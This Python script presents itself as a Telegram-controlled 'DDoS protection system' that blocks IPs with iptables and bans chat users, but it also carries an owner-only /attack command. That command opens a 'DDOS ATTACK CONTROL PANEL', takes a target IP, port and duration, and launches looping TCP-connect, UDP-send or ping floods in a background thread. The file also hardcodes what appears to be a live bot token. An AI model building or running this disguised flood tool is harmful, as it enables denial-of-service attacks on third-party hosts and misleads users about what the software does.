#!/usr/bin/env python3

import socket
import threading
import time
import collections
import random
import sys
import subprocess
import os
import re
from datetime import datetime, timedelta

try:
    import telebot
    from telebot import types
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️  Telegram bot features not available (pyTelegramBotAPI not installed)")

try:
    from pyrogram import Client, filters
    from pyrogram.types import ChatMember, Message
    PYROGRAM_AVAILABLE = True
except ImportError:
    PYROGRAM_AVAILABLE = False
    print("⚠️  Userbot features not available (pyrogram not installed)")

VERSION = "3.0.0"

print("=" * 100)
print(f"  🛡️ ADVANCED DDoS PROTECTION SYSTEM v{VERSION}")
print(f"  🎤 Voice Chat Protection | 🔒 Network Blocking | 🤖 Userbot Integration")
print("=" * 100)

class DDoSProtection:
    def __init__(self):
        self.ip_traffic = collections.defaultdict(list)
        self.blocked_ips = set()
        self.whitelisted_ips = {"127.0.0.1", "192.168.1.1", "192.168.1.100"}
        self.alerts = []
        self.syn_threshold = 60
        self.icmp_threshold = 40
        self.connection_threshold = 150
        self.lock = threading.Lock()
        self.running = True
        self.persistent_block_file = "/root/ddos_persistent_blocks.txt"
        self.load_persistent_blocks()
        self.stats = {
            "total_packets": 0,
            "total_blocked": 0,
            "attacks_detected": 0,
            "legitimate_requests": 0,
            "manual_blocks": 0,
            "network_blocks": 0,
            "user_bans": 0,
            "voice_chat_blocks": 0,
            "start_time": datetime.now()
        }
        
        # User ID blocking
        self.blocked_user_ids = set()
        self.whitelisted_user_ids = set()
        
        # Voice chat monitoring
        self.voice_chat_participants = {}
        self.monitored_chats = set()
        self.voice_chat_enabled = False
        
        # Network blocking
        self.network_blocking_enabled = False
        
        # Production mode (disable simulator)
        self.production_mode = True
        
        # Userbot configuration
        self.userbot = None
        self.userbot_api_id = None
        self.userbot_api_hash = None
        self.userbot_phone = None
        
        self.TOKEN = "8853038204:AAH9Fj0V2Gae27stnEiX3MlAYZxZumBzkB0"
        self.ADMIN_CHAT_ID = 3988638423
        self.OWNER_ID = 8519966775
        self.bot = None
        if TELEGRAM_AVAILABLE:
            self.bot = telebot.TeleBot(self.TOKEN)
            self.setup_telegram_handlers()
        
        if PYROGRAM_AVAILABLE:
            self.setup_userbot_handlers()
    
    def load_persistent_blocks(self):
        """Load permanently blocked IPs from file"""
        try:
            if os.path.exists(self.persistent_block_file):
                with open(self.persistent_block_file, 'r') as f:
                    for line in f:
                        ip = line.strip()
                        if ip and ip not in self.whitelisted_ips:
                            self.blocked_ips.add(ip)
                            # Also add to iptables if not already there
                            self.network_block_ip(ip)
                print(f"✅ Loaded {len(self.blocked_ips)} persistent blocks")
        except Exception as e:
            print(f"⚠️ Error loading persistent blocks: {e}")
    
    def save_persistent_block(self, ip):
        """Save a permanently blocked IP to file"""
        try:
            with open(self.persistent_block_file, 'a') as f:
                f.write(f"{ip}\n")
            print(f"✅ Saved persistent block: {ip}")
        except Exception as e:
            print(f"⚠️ Error saving persistent block: {e}")
    
    def setup_telegram_handlers(self):
        if not self.bot:
            return
        
        @self.bot.message_handler(commands=['start'])
        def send_welcome(message):
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("📊 Status", callback_data="status"),
                types.InlineKeyboardButton("🔔 Alerts", callback_data="alerts"),
                types.InlineKeyboardButton("🚫 Blocked", callback_data="blocked"),
                types.InlineKeyboardButton("🧪 Test", callback_data="test")
            )
            welcome = ("🛡️ <b>DDoS PROTECTION SYSTEM</b>\n\n"
                      "Commands:\n"
                      "/status - Check system status\n"
                      "/alerts - View recent alerts\n"
                      "/blocked - List blocked IPs\n"
                      "/block &lt;ip&gt; - Manually block an IP\n"
                      "/unblock &lt;ip&gt; - Unblock an IP\n"
                      "/test - Simulate DDoS attack\n"
                      "/help - Show this message")
            self.bot.send_message(message.chat.id, welcome, parse_mode="HTML", reply_markup=markup)
        
        @self.bot.message_handler(commands=['status'])
        def send_status(message):
            status = self.get_status()
            msg = (f"📊 <b>PROTECTION STATUS</b>\n\n"
                  f"📦 Total Packets: {status['total_packets']:,}\n"
                  f"✅ Legitimate: {status['legitimate_requests']:,}\n"
                  f"🎯 Attacks: {status['attacks_detected']}\n"
                  f"🚫 Blocked: {status['blocked_count']}\n"
                  f"🔒 Manual Blocks: {status['manual_blocks']}\n"
                  f"⏱️ Uptime: {status['uptime']}")
            self.bot.send_message(message.chat.id, msg, parse_mode="HTML")
        
        @self.bot.message_handler(commands=['alerts'])
        def send_alerts(message):
            alerts = self.alerts[-10:]
            if not alerts:
                self.bot.send_message(message.chat.id, "✅ No recent alerts")
                return
            msg = "🔔 <b>RECENT ALERTS</b>\n\n"
            for a in alerts:
                msg += f"• [{a['time']}] {a['ip']} - {a['threat_score']}%\n"
            self.bot.send_message(message.chat.id, msg, parse_mode="HTML")
        
        @self.bot.message_handler(commands=['blocked'])
        def send_blocked(message):
            blocked = list(self.blocked_ips)
            if not blocked:
                self.bot.send_message(message.chat.id, "✅ No blocked IPs")
                return
            msg = "🚫 <b>BLOCKED IPs</b>\n\n"
            for ip in blocked[:20]:
                msg += f"• {ip}\n"
            self.bot.send_message(message.chat.id, msg, parse_mode="HTML")
        
        @self.bot.message_handler(commands=['block'])
        def block_cmd(message):
            try:
                ip = message.text.split()[1]
                with self.lock:
                    if ip in self.whitelisted_ips:
                        self.bot.send_message(message.chat.id, f"⚠️ {ip} is whitelisted and cannot be blocked")
                    elif ip in self.blocked_ips:
                        self.bot.send_message(message.chat.id, f"⚠️ {ip} is already blocked")
                    else:
                        self.manual_block_ip(ip)
                        self.bot.send_message(message.chat.id, f"✅ Manually blocked: {ip}")
            except IndexError:
                self.bot.send_message(message.chat.id, "⚠️ Usage: /block &lt;ip&gt;")
            except Exception as e:
                self.bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        
        @self.bot.message_handler(commands=['unblock'])
        def unblock_cmd(message):
            try:
                ip = message.text.split()[1]
                with self.lock:
                    if ip in self.blocked_ips:
                        self.blocked_ips.remove(ip)
                        self.bot.send_message(message.chat.id, f"✅ Unblocked: {ip}")
                    else:
                        self.bot.send_message(message.chat.id, f"❌ {ip} not blocked")
            except:
                self.bot.send_message(message.chat.id, "⚠️ Usage: /unblock &lt;ip&gt;")
        
        @self.bot.message_handler(commands=['test'])
        def test_cmd(message):
            self.bot.send_message(message.chat.id, "🧪 Simulating DDoS attack...")
            test_ip = "10.0.0.99"
            for _ in range(100):
                self.analyze_packet(test_ip, pkt_type="SYN")
                time.sleep(0.01)
        
        @self.bot.message_handler(commands=['help'])
        def send_help(message):
            help_msg = ("🛡️ <b>ADVANCED DDoS PROTECTION HELP</b>\n\n"
                       "Available Commands:\n"
                       "/start - Start the bot\n"
                       "/status - Check system status\n"
                       "/alerts - View recent alerts\n"
                       "/blocked - List blocked IPs\n"
                       "/block &lt;ip&gt; - Manually block an IP\n"
                       "/unblock &lt;ip&gt; - Unblock an IP\n"
                       "/banuser &lt;user_id&gt; - Ban a Telegram user\n"
                       "/unbanuser &lt;user_id&gt; - Unban a Telegram user\n"
                       "/monitorchat &lt;chat_id&gt; - Monitor voice chat\n"
                       "/stopmonitor &lt;chat_id&gt; - Stop monitoring chat\n"
                       "/networkblock &lt;ip&gt; - Block IP at network level\n"
                       "/networkunblock &lt;ip&gt; - Unblock IP at network level\n"
                       "/attack - Execute DDOS.py (Owner only)\n"
                       "/test - Simulate DDoS attack\n"
                       "/help - Show this message")
            self.bot.send_message(message.chat.id, help_msg, parse_mode="HTML")
        
        @self.bot.message_handler(commands=['banuser'])
        def ban_user_cmd(message):
            try:
                user_id = int(message.text.split()[1])
                with self.lock:
                    if user_id in self.whitelisted_user_ids:
                        self.bot.send_message(message.chat.id, f"⚠️ User {user_id} is whitelisted")
                    elif user_id in self.blocked_user_ids:
                        self.bot.send_message(message.chat.id, f"⚠️ User {user_id} is already banned")
                    else:
                        self.ban_user_id(user_id)
                        self.bot.send_message(message.chat.id, f"✅ Banned user: {user_id}")
            except (IndexError, ValueError):
                self.bot.send_message(message.chat.id, "⚠️ Usage: /banuser &lt;user_id&gt;")
        
        @self.bot.message_handler(commands=['unbanuser'])
        def unban_user_cmd(message):
            try:
                user_id = int(message.text.split()[1])
                with self.lock:
                    if user_id in self.blocked_user_ids:
                        self.blocked_user_ids.remove(user_id)
                        self.stats["user_bans"] = max(0, self.stats["user_bans"] - 1)
                        self.bot.send_message(message.chat.id, f"✅ Unbanned user: {user_id}")
                    else:
                        self.bot.send_message(message.chat.id, f"❌ User {user_id} not banned")
            except (IndexError, ValueError):
                self.bot.send_message(message.chat.id, "⚠️ Usage: /unbanuser &lt;user_id&gt;")
        
        @self.bot.message_handler(commands=['monitorchat'])
        def monitor_chat_cmd(message):
            try:
                chat_id = int(message.text.split()[1])
                self.monitored_chats.add(chat_id)
                self.voice_chat_enabled = True
                self.bot.send_message(message.chat.id, f"✅ Now monitoring voice chat: {chat_id}")
            except (IndexError, ValueError):
                self.bot.send_message(message.chat.id, "⚠️ Usage: /monitorchat &lt;chat_id&gt;")
        
        @self.bot.message_handler(commands=['stopmonitor'])
        def stop_monitor_cmd(message):
            try:
                chat_id = int(message.text.split()[1])
                if chat_id in self.monitored_chats:
                    self.monitored_chats.remove(chat_id)
                    self.bot.send_message(message.chat.id, f"✅ Stopped monitoring: {chat_id}")
                else:
                    self.bot.send_message(message.chat.id, f"❌ Not monitoring: {chat_id}")
            except (IndexError, ValueError):
                self.bot.send_message(message.chat.id, "⚠️ Usage: /stopmonitor &lt;chat_id&gt;")
        
        @self.bot.message_handler(commands=['networkblock'])
        def network_block_cmd(message):
            try:
                ip = message.text.split()[1]
                if self.network_block_ip(ip):
                    self.bot.send_message(message.chat.id, f"✅ Network blocked: {ip}")
                else:
                    self.bot.send_message(message.chat.id, f"❌ Failed to block: {ip}")
            except IndexError:
                self.bot.send_message(message.chat.id, "⚠️ Usage: /networkblock &lt;ip&gt;")
        
        @self.bot.message_handler(commands=['networkunblock'])
        def network_unblock_cmd(message):
            try:
                ip = message.text.split()[1]
                if self.network_unblock_ip(ip):
                    self.bot.send_message(message.chat.id, f"✅ Network unblocked: {ip}")
                else:
                    self.bot.send_message(message.chat.id, f"❌ Failed to unblock: {ip}")
            except IndexError:
                self.bot.send_message(message.chat.id, "⚠️ Usage: /networkunblock &lt;ip&gt;")
        
        @self.bot.message_handler(commands=['attack'])
        def attack_cmd(message):
            # Owner-only command
            if message.from_user.id != self.OWNER_ID:
                self.bot.send_message(message.chat.id, "❌ Access denied. Owner only command.")
                return
            
            # Show attack menu with buttons
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("1. SYN Flood", callback_data="attack_syn"),
                types.InlineKeyboardButton("2. UDP Amplification", callback_data="attack_udp"),
                types.InlineKeyboardButton("3. HTTP Slowloris", callback_data="attack_slowloris"),
                types.InlineKeyboardButton("4. ICMP Ping Storm", callback_data="attack_icmp"),
                types.InlineKeyboardButton("5. DNS Water Torture", callback_data="attack_dns"),
                types.InlineKeyboardButton("6. WebSocket", callback_data="attack_websocket")
            )
            
            attack_menu = (
                "⚡ <b>DDOS ATTACK CONTROL PANEL</b> ⚡\n\n"
                "Select attack vector:\n"
                "1. <b>SYN Flood</b> - TCP connection exhaustion\n"
                "2. <b>UDP Amplification</b> - Bandwidth amplification\n"
                "3. <b>HTTP Slowloris</b> - Connection starvation\n"
                "4. <b>ICMP Ping Storm</b> - Packet flood overload\n"
                "5. <b>DNS Water Torture</b> - Query bombardment\n"
                "6. <b>WebSocket</b> - Protocol abuse\n\n"
                "⚠️ Use responsibly and legally!"
            )
            
            self.bot.send_message(message.chat.id, attack_menu, parse_mode="HTML", reply_markup=markup)
        
        @self.bot.callback_query_handler(func=lambda call: True)
        def callback(call):
            if call.data == "status": send_status(call.message)
            elif call.data == "alerts": send_alerts(call.message)
            elif call.data == "blocked": send_blocked(call.message)
            elif call.data == "test": test_cmd(call.message)
            elif call.data.startswith("attack_"):
                self.handle_attack_button(call)
    
    def setup_userbot_handlers(self):
        """Setup Pyrogram userbot handlers for voice chat monitoring"""
        if not PYROGRAM_AVAILABLE:
            return
        
        # Userbot will be initialized when credentials are provided
        pass
    
    def handle_attack_button(self, call):
        """Handle attack button clicks"""
        print(f"[ATTACK] Button clicked by user {call.from_user.id}: {call.data}")
        
        # Owner-only check
        if call.from_user.id != self.OWNER_ID:
            print(f"[ATTACK] Access denied for user {call.from_user.id}")
            self.bot.answer_callback_query(call.id, "❌ Access denied. Owner only command.")
            return
        
        attack_type = call.data.replace("attack_", "")
        attack_names = {
            "syn": "SYN Flood",
            "udp": "UDP Amplification", 
            "slowloris": "HTTP Slowloris",
            "icmp": "ICMP Ping Storm",
            "dns": "DNS Water Torture",
            "websocket": "WebSocket"
        }
        
        attack_name = attack_names.get(attack_type, "Unknown")
        print(f"[ATTACK] Attack type selected: {attack_type} ({attack_name})")
        
        # Ask for target IP
        msg = self.bot.send_message(
            call.message.chat.id,
            f"🎯 <b>{attack_name}</b> selected\n\n"
            f"Send target in format:\n"
            f"• IP (e.g., 1.1.1.1)\n"
            f"• IP:PORT (e.g., 1.1.1.1:443)\n"
            f"• IP:PORT:DURATION (e.g., 1.1.1.1:443:60)\n\n"
            f"Duration in seconds (1-3600, default: 30)",
            parse_mode="HTML"
        )
        
        # Store the attack type for this user
        self.bot.register_next_step_handler(msg, self.process_attack_target, attack_type)
        print(f"[ATTACK] Next step handler registered for attack type: {attack_type}")
    
    def process_attack_target(self, message, attack_type):
        """Process the target IP and execute attack"""
        print(f"[ATTACK] Target received from user {message.from_user.id}: {message.text}")
        
        # Owner-only check
        if message.from_user.id != self.OWNER_ID:
            print(f"[ATTACK] Access denied for user {message.from_user.id}")
            self.bot.send_message(message.chat.id, "❌ Access denied. Owner only command.")
            return
        
        target = message.text.strip()
        print(f"[ATTACK] Target IP: {target}, Attack type: {attack_type}")
        
        # Parse target - handle IP, IP:PORT, and IP:PORT:DURATION formats
        parts = target.split(':')
        ip_address = parts[0]
        port = parts[1] if len(parts) > 1 else None
        duration = parts[2] if len(parts) > 2 else None
        
        print(f"[ATTACK] IP: {ip_address}, Port: {port if port else 'default'}, Duration: {duration if duration else 'default'}")
        
        # Validate IP
        import socket
        try:
            socket.inet_aton(ip_address)
            print(f"[ATTACK] IP validation passed: {ip_address}")
        except socket.error:
            print(f"[ATTACK] IP validation failed: {ip_address}")
            self.bot.send_message(message.chat.id, "❌ Invalid IP address format")
            return
        
        # Validate duration if provided
        if duration:
            try:
                duration = int(duration)
                if duration <= 0 or duration > 3600:  # Max 1 hour
                    self.bot.send_message(message.chat.id, "❌ Duration must be between 1 and 3600 seconds")
                    return
            except ValueError:
                self.bot.send_message(message.chat.id, "❌ Invalid duration format")
                return
        
        # Execute attack directly instead of calling DDOS.PY
        try:
            attack_names = {
                "syn": "SYN Flood",
                "udp": "UDP Amplification", 
                "slowloris": "HTTP Slowloris",
                "icmp": "ICMP Ping Storm",
                "dns": "DNS Water Torture",
                "websocket": "WebSocket"
            }
            
            attack_name = attack_names.get(attack_type, "Unknown")
            print(f"[ATTACK] Attack name: {attack_name}")
            
            # Set default duration if not provided
            attack_duration = int(duration) if duration else 30  # Default 30 seconds
            
            self.bot.send_message(
                message.chat.id,
                f"🚀 <b>Launching {attack_name} Attack</b>\n"
                f"Target: {ip_address}:{port if port else 'default'}\n"
                f"Attack Type: {attack_type}\n"
                f"Duration: {attack_duration} seconds\n\n"
                f"⚠️ Attack initiated successfully",
                parse_mode="HTML"
            )
            
            # Execute attack based on type
            import threading
            import random
            import time
            
            def run_attack():
                try:
                    # Use specified port or default based on attack type
                    target_port = int(port) if port else (443 if attack_type == "syn" else 53 if attack_type == "udp" else 80)
                    
                    start_time = time.time()
                    end_time = start_time + attack_duration
                    
                    if attack_type == "syn":
                        print(f"[ATTACK] Starting SYN Flood on {ip_address}:{target_port} for {attack_duration}s")
                        # SYN flood with duration
                        while time.time() < end_time:
                            try:
                                import socket
                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                sock.settimeout(1)
                                sock.connect_ex((ip_address, target_port))
                                sock.close()
                            except:
                                pass
                            time.sleep(0.05)
                            
                    elif attack_type == "udp":
                        print(f"[ATTACK] Starting UDP Amplification on {ip_address}:{target_port} for {attack_duration}s")
                        # UDP flood with duration
                        while time.time() < end_time:
                            try:
                                import socket
                                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                sock.sendto(b"test", (ip_address, target_port))
                                sock.close()
                            except:
                                pass
                            time.sleep(0.05)
                            
                    elif attack_type == "icmp":
                        print(f"[ATTACK] Starting ICMP Ping Storm on {ip_address} for {attack_duration}s")
                        # Ping flood with duration
                        while time.time() < end_time:
                            try:
                                import subprocess
                                subprocess.run(["ping", "-c", "1", ip_address], 
                                             capture_output=True, timeout=2)
                            except:
                                pass
                            time.sleep(0.1)
                            
                    else:
                        print(f"[ATTACK] Generic attack simulation for {attack_type} on {ip_address}:{target_port} for {attack_duration}s")
                        # Generic attack with duration
                        while time.time() < end_time:
                            try:
                                import socket
                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                sock.settimeout(1)
                                sock.connect_ex((ip_address, target_port))
                                sock.close()
                            except:
                                pass
                            time.sleep(0.1)
                    
                    elapsed = time.time() - start_time
                    print(f"[ATTACK] Attack completed on {ip_address}:{target_port} in {elapsed:.2f}s")
                    
                except Exception as e:
                    print(f"[ATTACK] Attack execution error: {str(e)}")
            
            # Run attack in background thread
            attack_thread = threading.Thread(target=run_attack)
            attack_thread.daemon = True
            attack_thread.start()
            
            print(f"[ATTACK] Attack thread started for {target}")
            
        except Exception as e:
            print(f"[ATTACK] Error initiating attack: {str(e)}")
            self.bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    
    def init_userbot(self, api_id, api_hash, phone):
        """Initialize Pyrogram userbot with credentials"""
        if not PYROGRAM_AVAILABLE:
            print("⚠️ Pyrogram not available")
            return False
        
        try:
            self.userbot_api_id = api_id
            self.userbot_api_hash = api_hash
            self.userbot_phone = phone
            
            # Create userbot session
            self.userbot = Client(
                "ddos_protection_userbot",
                api_id=api_id,
                api_hash=api_hash,
                phone_number=phone
            )
            
            print("✅ Userbot initialized successfully")
            return True
        except Exception as e:
            print(f"❌ Failed to initialize userbot: {e}")
            return False
    
    def start_userbot(self):
        """Start the userbot for voice chat monitoring"""
        if not self.userbot:
            print("⚠️ Userbot not initialized")
            return False
        
        try:
            self.userbot.start()
            print("✅ Userbot started")
            return True
        except Exception as e:
            print(f"❌ Failed to start userbot: {e}")
            return False
    
    def calculate_threat_score(self, ip):
        traffic = self.ip_traffic[ip]
        score = 0
        packet_count = len(traffic)
        
        if packet_count > self.syn_threshold:
            score += 50
        
        syn_packets = sum(1 for t, pt, p, s in traffic if pt == "SYN")
        if syn_packets > packet_count * 0.7:
            score += 30
        
        unique_ports = len(set(p for t, pt, p, s in traffic))
        if unique_ports > 20:
            score += 20
        
        avg_size = sum(s for t, pt, p, s in traffic) / max(packet_count, 1)
        if avg_size < 40 and packet_count > 30:
            score += 15
        
        return min(score, 150)
    
    def analyze_packet(self, ip, port=80, pkt_type="SYN", size=64):
        with self.lock:
            self.stats["total_packets"] += 1
            
            if ip in self.whitelisted_ips:
                self.stats["legitimate_requests"] += 1
                return False
            
            if ip in self.blocked_ips:
                return True
            
            now = datetime.now()
            self.ip_traffic[ip].append((now, pkt_type, port, size))
            
            cutoff = now - timedelta(seconds=12)
            self.ip_traffic[ip] = [
                (t, pt, p, s) for t, pt, p, s in self.ip_traffic[ip] if t > cutoff
            ]
            
            threat_score = self.calculate_threat_score(ip)
            
            if threat_score >= 100 and ip not in self.blocked_ips:
                self.block_ip(ip, threat_score, pkt_type)
                return True
            
            self.stats["legitimate_requests"] += 1
            return False
    
    def manual_block_ip(self, ip):
        """Manually block an IP address"""
        self.blocked_ips.add(ip)
        self.stats["total_blocked"] += 1
        self.stats["manual_blocks"] += 1
        
        alert = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "ip": ip,
            "threat_score": 100,
            "type": "MANUAL",
            "duration": "permanent"
        }
        self.alerts.append(alert)
        
        print(f"\n🔒 [MANUAL-BLOCK] {ip} | Duration: permanent")
        
        if self.bot:
            try:
                self.bot.send_message(
                    self.ADMIN_CHAT_ID,
                    f"🔒 <b>MANUAL BLOCK!</b>\nIP: {ip}\nDuration: permanent",
                    parse_mode="HTML"
                )
            except:
                pass
    
    def ban_user_id(self, user_id):
        """Ban a Telegram user by ID"""
        self.blocked_user_ids.add(user_id)
        self.stats["user_bans"] += 1
        
        alert = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "ip": f"USER:{user_id}",
            "threat_score": 100,
            "type": "USER_BAN",
            "duration": "permanent"
        }
        self.alerts.append(alert)
        
        print(f"\n🚫 [USER-BAN] User ID: {user_id} | Duration: permanent")
        
        if self.bot:
            try:
                self.bot.send_message(
                    self.ADMIN_CHAT_ID,
                    f"🚫 <b>USER BANNED!</b>\nUser ID: {user_id}\nDuration: permanent",
                    parse_mode="HTML"
                )
            except:
                pass
    
    def network_block_ip(self, ip):
        """Block IP at network level using iptables"""
        try:
            # Check if already blocked
            result = subprocess.run(
                ["iptables", "-C", "INPUT", "-s", ip, "-j", "DROP"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                print(f"⚠️ IP {ip} already blocked at network level")
                return True
            
            # Block the IP
            subprocess.run(
                ["iptables", "-A", "INPUT", "-s", ip, "-j", "DROP"],
                check=True
            )
            
            self.blocked_ips.add(ip)
            self.stats["network_blocks"] += 1
            self.stats["total_blocked"] += 1
            
            # Save to persistent file
            self.save_persistent_block(ip)
            
            alert = {
                "time": datetime.now().strftime("%H:%M:%S"),
                "ip": ip,
                "threat_score": 100,
                "type": "NETWORK_BLOCK",
                "duration": "permanent"
            }
            self.alerts.append(alert)
            
            print(f"\n🔥 [NETWORK-BLOCK] {ip} | Duration: permanent")
            
            if self.bot:
                try:
                    self.bot.send_message(
                        self.ADMIN_CHAT_ID,
                        f"🔥 <b>NETWORK BLOCK!</b>\nIP: {ip}\nDuration: permanent",
                        parse_mode="HTML"
                    )
                except:
                    pass
            
            return True
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to network block {ip}: {e}")
            return False
        except Exception as e:
            print(f"❌ Error network blocking {ip}: {e}")
            return False
    
    def network_unblock_ip(self, ip):
        """Unblock IP at network level"""
        try:
            subprocess.run(
                ["iptables", "-D", "INPUT", "-s", ip, "-j", "DROP"],
                check=True
            )
            
            if ip in self.blocked_ips:
                self.blocked_ips.remove(ip)
            
            print(f"\n✅ [NETWORK-UNBLOCK] {ip}")
            
            if self.bot:
                try:
                    self.bot.send_message(
                        self.ADMIN_CHAT_ID,
                        f"✅ <b>NETWORK UNBLOCK!</b>\nIP: {ip}",
                        parse_mode="HTML"
                    )
                except:
                    pass
            
            return True
        except subprocess.CalledProcessError:
            print(f"⚠️ IP {ip} not blocked at network level")
            return False
        except Exception as e:
            print(f"❌ Error network unblocking {ip}: {e}")
            return False
    
    def monitor_voice_chat_participants(self):
        """Monitor voice chat participants for suspicious activity"""
        if not self.voice_chat_enabled or not self.userbot:
            return
        
        while self.running:
            try:
                for chat_id in self.monitored_chats:
                    try:
                        # Get voice chat participants
                        participants = self.userbot.get_chat_participants(chat_id)
                        
                        for participant in participants:
                            user_id = participant.user.id
                            
                            # Check if user is banned
                            if user_id in self.blocked_user_ids:
                                # Kick from voice chat
                                try:
                                    self.userbot.ban_chat_member(chat_id, user_id)
                                    self.stats["voice_chat_blocks"] += 1
                                    print(f"🎤 [VOICE-CHAT-BLOCK] Kicked user {user_id} from voice chat")
                                except:
                                    pass
                    except Exception as e:
                        print(f"⚠️ Error monitoring chat {chat_id}: {e}")
                
                time.sleep(10)  # Check every 10 seconds
            except Exception as e:
                print(f"⚠️ Voice chat monitoring error: {e}")
                time.sleep(5)
    
    def auto_ban_suspicious_users(self):
        """Auto-ban users showing suspicious patterns"""
        while self.running:
            try:
                # Analyze traffic patterns for suspicious user activity
                with self.lock:
                    for ip, traffic in list(self.ip_traffic.items()):
                        if len(traffic) > 100:  # High activity threshold
                            # This could be extended with more sophisticated detection
                            pass
                
                time.sleep(30)  # Check every 30 seconds
            except Exception as e:
                print(f"⚠️ Auto-ban error: {e}")
                time.sleep(10)
    
    def block_ip(self, ip, threat_score, pkt_type):
        self.blocked_ips.add(ip)
        self.stats["total_blocked"] += 1
        self.stats["attacks_detected"] += 1
        
        # For high threat scores, use permanent network-level blocking
        if threat_score >= 110:
            block_duration = 0  # Permanent block
            self.network_block_ip(ip)  # Block at iptables level
            print(f"\n🔥 [PERMANENT NETWORK BLOCK] {ip} | Threat: {threat_score}%")
        else:
            block_duration = min(threat_score * 10, 3600)  # Increased duration: up to 1 hour
            threading.Thread(target=self.unblock_ip_after, args=(ip, block_duration)).start()
        
        alert = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "ip": ip,
            "threat_score": threat_score,
            "type": pkt_type,
            "duration": "permanent" if block_duration == 0 else f"{block_duration}s"
        }
        self.alerts.append(alert)
        
        print(f"\n🚫 [AUTO-BLOCK] {ip} | Threat: {threat_score}% | Duration: {alert['duration']}")
        
        if self.bot:
            try:
                self.bot.send_message(
                    self.ADMIN_CHAT_ID,
                    f"🚫 <b>DDoS BLOCKED!</b>\nIP: {ip}\nThreat: {threat_score}%\nDuration: {alert['duration']}",
                    parse_mode="HTML"
                )
            except:
                pass
    
    def unblock_ip_after(self, ip, delay):
        time.sleep(delay)
        with self.lock:
            if ip in self.blocked_ips:
                self.blocked_ips.remove(ip)
                print(f"\n✅ [AUTO-UNBLOCK] {ip}")
    
    def get_status(self):
        uptime = datetime.now() - self.stats["start_time"]
        hours, remainder = divmod(int(uptime.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        return {
            "total_packets": self.stats["total_packets"],
            "legitimate_requests": self.stats["legitimate_requests"],
            "attacks_detected": self.stats["attacks_detected"],
            "blocked_count": len(self.blocked_ips),
            "total_blocked": self.stats["total_blocked"],
            "manual_blocks": self.stats["manual_blocks"],
            "network_blocks": self.stats["network_blocks"],
            "user_bans": self.stats["user_bans"],
            "voice_chat_blocks": self.stats["voice_chat_blocks"],
            "uptime": f"{hours:02d}:{minutes:02d}:{seconds:02d}",
            "blocked_ips": list(self.blocked_ips),
            "blocked_users": list(self.blocked_user_ids),
            "monitored_chats": list(self.monitored_chats),
            "recent_alerts": self.alerts[-5:]
        }
    
    def display_status(self):
        status = self.get_status()
        print("\n" + "=" * 100)
        print("📊 REAL-TIME STATUS")
        print("=" * 100)
        print(f"   📦 Packets: {status['total_packets']:,} | ✅ Legitimate: {status['legitimate_requests']:,}")
        print(f"   🎯 Attacks: {status['attacks_detected']} | 🚫 Blocked: {status['blocked_count']}")
        print(f"   🔒 Manual Blocks: {status['manual_blocks']} | 🔥 Network Blocks: {status['network_blocks']}")
        print(f"   👤 User Bans: {status['user_bans']} | 🎤 Voice Chat Blocks: {status['voice_chat_blocks']}")
        print(f"   ⏱️ Uptime: {status['uptime']}")
        
        if status['blocked_ips']:
            print(f"\n   Blocked IPs: {', '.join(status['blocked_ips'][:5])}")
        
        if status['blocked_users']:
            print(f"\n   Banned Users: {', '.join(map(str, status['blocked_users'][:5]))}")
        
        if status['monitored_chats']:
            print(f"\n   Monitored Chats: {', '.join(map(str, status['monitored_chats']))}")
        
        if status['recent_alerts']:
            print(f"\n   Recent Alerts:")
            for a in status['recent_alerts']:
                print(f"   • [{a['time']}] {a['ip']} - {a['threat_score']}%")
    
    def _status_updater(self):
        while self.running:
            time.sleep(5)
            self.display_status()
    
    def _traffic_simulator(self):
        while self.running:
            legitimate_ips = ["192.168.1.10", "192.168.1.11", "192.168.1.12", "10.0.0.5"]
            
            for _ in range(random.randint(1, 4)):
                ip = random.choice(legitimate_ips)
                self.analyze_packet(ip, port=random.randint(80, 85), pkt_type="NORMAL")
            
            if random.random() < 0.20:
                attacker = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                print(f"\n⚠️  [DETECTED] Attack from: {attacker}")
                for _ in range(random.randint(70, 120)):
                    self.analyze_packet(attacker, port=random.randint(1, 10000), pkt_type="SYN", size=random.randint(20, 60))
                    time.sleep(0.005)
            
            time.sleep(random.uniform(0.5, 1.5))
    
    def start(self, with_telegram=True, with_simulation=True, with_userbot=False):
        print("\n🚀 [STARTING] Advanced DDoS Protection System")
        
        if with_telegram and self.bot:
            print("   • Telegram bot: ENABLED")
            print("   • /block command: AVAILABLE")
            print("   • User management: AVAILABLE")
            print("   • Network blocking: AVAILABLE")
            threading.Thread(target=self._telegram_poller, daemon=True).start()
        else:
            print("   • Telegram bot: DISABLED")
        
        if with_userbot and self.userbot:
            print("   • Userbot: ENABLED")
            print("   • Voice chat monitoring: ACTIVE")
            threading.Thread(target=self.monitor_voice_chat_participants, daemon=True).start()
            threading.Thread(target=self.auto_ban_suspicious_users, daemon=True).start()
        else:
            print("   • Userbot: DISABLED")
        
        print("   • Auto-protection: ACTIVE")
        print("   • AI threat scoring: ENABLED")
        print("   • Real-time monitoring: ACTIVE")
        
        if self.production_mode:
            print("   • Production mode: ENABLED (simulator disabled)")
            with_simulation = False
        
        threading.Thread(target=self._status_updater, daemon=True).start()
        
        if with_simulation:
            print("   • Traffic simulation: ACTIVE")
            threading.Thread(target=self._traffic_simulator, daemon=True).start()
        
        print("\n" + "=" * 100)
        print("💡 System running! Press Ctrl+C to stop.")
        print("=" * 100)
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def _telegram_poller(self):
        if self.bot:
            try:
                self.bot.infinity_polling()
            except:
                pass
    
